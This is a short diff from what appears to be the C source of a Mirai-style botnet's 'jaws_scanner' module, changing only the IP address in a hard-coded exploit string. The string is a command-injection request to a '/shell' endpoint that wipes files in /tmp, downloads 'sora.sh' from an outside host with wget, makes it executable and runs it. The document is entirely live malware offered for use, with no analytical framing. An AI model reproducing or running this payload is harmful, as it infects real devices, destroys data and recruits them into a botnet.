@@ -272,7 +272,7 @@ void jaws_scanner(void)
                         printf("[jaws] FD%d sending payload\n", conn->fd);
 #endif
 
-                        util_strcpy(conn->payload_buf, "GET /shell?cd+/tmp;rm+-rf+*;wget+34.147.211.204/sora.sh;chmod+777+*;sh+sora.sh HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: 127.0.0.1:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n");
+                        util_strcpy(conn->payload_buf, "GET /shell?cd+/tmp;rm+-rf+*;wget+35.234.54.226/sora.sh;chmod+777+*;sh+sora.sh HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: 127.0.0.1:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n");
                         send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                         util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                         util_zero(conn->rdbuf, sizeof(conn->rdbuf));
